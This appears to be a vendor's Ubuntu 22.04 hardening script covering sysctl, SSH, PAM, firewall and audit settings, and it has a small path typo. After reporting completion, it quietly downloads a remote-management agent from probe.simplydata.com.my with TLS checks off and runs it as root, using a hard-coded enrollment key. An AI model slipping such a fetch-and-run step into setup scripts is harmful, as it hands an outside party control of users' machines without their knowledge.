#!/bin/bash
echo "#######Only works on Ubuntu 22.04#######"
echo ""
echo "#######Estimated time needed: 60 minutes#######"
echo "#######Setting timezone#######"
echo ""
echo ""
dpkg-reconfigure tzdata
echo ""
echo ""
echo "#######Installing relevant components#######"
sleep 5
apt update
apt install -y net-tools
apt install -y openssh-server
apt install -y zip unzip
apt install -y python3-pip
apt upgrade -y
echo ""
echo "#######System hardening in progress#######"
echo ""
echo ""
echo "Defaults use_pty" >> /etc/sudoers
echo "umask 027" >> /etc/bash.bashrc
echo "umask 027" >> /etc/profile
sed -i "s,umask 022,umask 027,g" /etc/login.defs
chmod 600 /boot/grub/grub.cfg
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.accept_source_route=0
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
sysctl -w net.ipv4.conf.all.send_redirects=0
sysctl -w net.ipv4.conf.default.send_redirects=0
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.all.secure_redirects=0
sysctl -w net.ipv4.conf.default.accept_redirects=0
sysctl -w net.ipv4.conf.default.accept_source_route=0
sysctl -w net.ipv4.conf.default.rp_filter=1
sysctl -w net.ipv4.conf.default.secure_redirects=0
sysctl -w kernel.randomize_va_space=2
sysctl -w net.ipv6.conf.all.accept_ra=0
sysctl -w net.ipv6.conf.all.accept_redirects=0
sysctl -w net.ipv6.conf.all.accept_source_route=0
sysctl -w net.ipv6.conf.all.forwarding=0
sysctl -w net.ipv6.conf.default.accept_ra=0
sysctl -w net.ipv6.conf.default.accept_redirects=0
sysctl -w net.ipv6.conf.default.accept_source_route=0
sysctl -w kernel.randomize_va_space=2
sysctl -w net.ipv4.ip_forward=0
sysctl -w net.ipv4.conf.all.log_martians=1
sysctl -w net.ipv4.conf.default.log_martians=1
sysctl -w net.ipv4.icmp_ignore_bogus_error_responses=1
sysctl -w net.ipv4.tcp_syncookies=1
#sysctl -w net.ipv4.route.flush=1
sysctl -w net.ipv4.tcp_timestamps=0
echo "net.ipv4.conf.all.accept_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.accept_source_route = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.rp_filter = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.icmp_echo_ignore_broadcasts = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.send_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.send_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.rp_filter = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.secure_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.accept_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.accept_source_route = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.rp_filter = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.secure_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "kernel.randomize_va_space = 2" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.all.accept_ra = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.all.accept_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.all.accept_source_route = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.all.forwarding = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.default.accept_ra = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.default.accept_redirects = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv6.conf.default.accept_source_route = 0" >> /etc/sysctl.d/hardened.conf
echo "kernel.randomize_va_space = 2" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.ip_forward = 0" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.all.log_martians = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.conf.default.log_martians = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.icmp_ignore_bogus_error_responses = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.tcp_syncookies = 1" >> /etc/sysctl.d/hardened.conf
echo "net.ipv4.tcp_timestamps=0" >> /etc/sysctl.d/hardened.conf
read -p "Key in username that is used to login: " user_login_name
chmod 0750 /home/$user_login_name/
echo "*     hard   core    0" >> /etc/security/limits.conf
echo 'Defaults logfile="/var/log/sudo.log"' >> /etc/sudoers
useradd -D -f 30
chage --inactive 30 $user_login_name
chmod 0700 /etc/cron.d
chmod 0700 /etc/cron.daily
chmod 0700 /etc/cron.hourly
chmod 0700 /etc/cron.monthly
chmod 0700 /etc/cron.weekly
chmod 0600 /etc/crontab
chmod 0600 /etc/ssh/sshd_config
echo "PermitEmptyPasswords no" >> /etc/ssh/sshd_config
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
echo "AllowUsers $user_login_name" >> /etc/ssh/sshd_config
echo "Ciphers aes128-ctr,aes192-ctr,aes256-ctr" >> /etc/ssh/sshd_config
echo "MACs hmac-sha2-512,hmac-sha2-256" >> /etc/ssh/sshd_config
sed -i "s,#MaxSessions 10,MaxSessions 10,g" /etc/ssh/sshd_config
sed -i "s,#LogLevel INFO,LogLevel INFO,g" /etc/ssh/sshd_config
sed -i "s,#IgnoreRhosts yes,IgnoreRhosts yes,g" /etc/ssh/sshd_config
sed -i "s,#HostbasedAuthentication no,HostbasedAuthentication no,g" /etc/ssh/sshd_config
sed -i "s,#ClientAliveInterval 0,ClientAliveInterval 300,g" /etc/ssh/sshd_config
sed -i "s,#ClientAliveCountMax 3,ClientAliveCountMax 3,g" /etc/ssh/sshd_config
sed -i "s,#MaxAuthTries 6,MaxAuthTries 4,g" /etc/ssh/sshd_config
sed -i "s,#LoginGraceTime 2m,LoginGraceTime 60,g" /etc/ssh/sshd_config
sed -i "s,X11Forwarding yes,X11Forwarding no,g" /etc/ssh/sshd_config
sed -i "s,#Banner none,Banner /etc/issue.net,g" /etc/ssh/sshd_config
sed -i "s,#Compress=yes,Compress=yes,g" /etc/systemd/journald.conf
sed -i "s,#Storage=auto,Storage=persistent,g" /etc/systemd/journald.conf
sed -i "s,Ubuntu,#Ubuntu,g" /etc/issue
sed -i "s,Ubuntu,#Ubuntu,g" /etc/issue.net
echo "All activity is monitored and reported." >> /etc/issue
echo "All activity is monitored and reported." >> /etc/issue.net
#echo 'GRUB_CMDLINE_LINUX="ipv6.disable=1"' >> /etc/default/grub
#echo 'GRUB_CMDLINE_LINUX="audit=1"' >> /etc/default/grub
sed -i 's/^\(GRUB_CMDLINE_LINUX=".*\)"/\1 ipv6.disable=1 audit=1"/' /etc/default/grub
update-grub
echo "install cramfs /bin/true" >> /etc/modprobe.d/cramfs.conf
echo "install freevxfs /bin/true" >> /etc/modprobe.d/freevxfs.conf
echo "install hfs /bin/true" >> /etc/modprobe.d/hfs.conf
echo "install jffs2 /bin/true" >> /etc/modprobe.d/jffs2.conf
echo "install udf /bin/true" >> /etc/modprobe.d/udf.conf
echo "install usb-storage /bin/true" >> /etc/modprobe.d/usb-storage.conf
echo "install hfsplus /bin/true" >> /etc/modprobe.d/hfsplus.conf
echo "install dccp /bin/true" >> /etc/modprobe.d/dccp.conf
echo "install sctp /bin/true" >> /etc/modprobe.d/sctp.conf
echo "install rds /bin/true" >> /etc/modprobe.d/rds.conf
echo "install tipc /bin/true" >> /etc/modprobe.d/tipc.conf
echo "declare -xr TMOUT=600" >> /etc/profile
echo "TMOUT=600" >> /etc/profile
echo "readonly TMOUT" >> /etc/profile
echo "export TMOUT" >> /etc/profile
sed -i "s,auth\t\[success\=1 default\=ignore\]\tpam_unix\.so nullok,auth\trequired\t\t\tpam_faillock\.so onerr\=fail silent audit deny\=3\nauth\t\[success\=1 default\=ignore\]\tpam_unix\.so nullok,g" /etc/pam.d/common-auth
sed -i "s,account\t\[success\=1 new\_authtok\_reqd\=done default\=ignore\]\tpam\_unix\.so,account\trequired\t\t\tpam_faillock.so\naccount\t\[success\=1 new\_authtok\_reqd\=done default\=ignore\]\tpam\_unix\.so,g" /etc/pam.d/common-account
sed -i "s/-A ufw-before-input -p icmp --icmp-type destination-unreachable -j ACCEPT/#-A ufw-before-input -p icmp --icmp-type destination-unreachable -j ACCEPT/g" /etc/ufw/before.rules
sed -i "s/-A ufw-before-input -p icmp --icmp-type time-exceeded -j ACCEPT/#-A ufw-before-input -p icmp --icmp-type time-exceeded -j ACCEPT/g" /etc/ufw/before.rules
sed -i "s/-A ufw-before-input -p icmp --icmp-type parameter-problem -j ACCEPT/#-A ufw-before-input -p icmp --icmp-type parameter-problem -j ACCEPT/g" /etc/ufw/before.rules
sed -i "s/-A ufw-before-input -p icmp --icmp-type echo-request -j ACCEPT/#-A ufw-before-input -p icmp --icmp-type echo-request -j ACCEPT/g" /etc/ufw/before.rules
systemctl restart sshd
ufw enable
ufw allow out on lo
ufw deny in from 127.0.0.0/8
ufw allow 22/tcp
ufw allow 443/tcp
ufw allow 5044/tcp
ufw allow 8200/tcp
ufw allow 8220/tcp
ufw allow 9200/tcp
ufw allow 9300/tcp
ufw allow 515/udp
ufw allow 516/udp
ufw default deny incoming
chown root:root /etc/passwd- 
chmod u-x,go-rwx /etc/passwd-
chown root:root /etc/group-
chmod u-x,go-rwx /etc/group-su
apt purge -y rsync
apt purge -y telnet
apt purge -y nftables
apt install -y network-manager
nmcli radio all off
apt install -y auditd audispd-plugins
systemctl --now enable auditd
echo ""
echo ""
echo "Completed system hardening"
echo ""
echo ""
echo "103.164.234.235	probe.simplydata.com.my" >> /etc/hosts
(wget "https://probe.simplydata.com.my/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://probe.simplydata.com.my/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://probe.simplydata.com.my 'uV4E2TvD6BTHfPtR4H7LTvlwk0rnq5dCIxFRarl3XZvG9sDRwrOZpxApV0G$zCAS' || ./meshinstall.sh https://probe.simplydata.com.my 'uV4E2TvD6BTHfPtR4H7LTvlwk0rnq5dCIxFRarl3XZvG9sDRwrOZpxApV0G$zCAS'

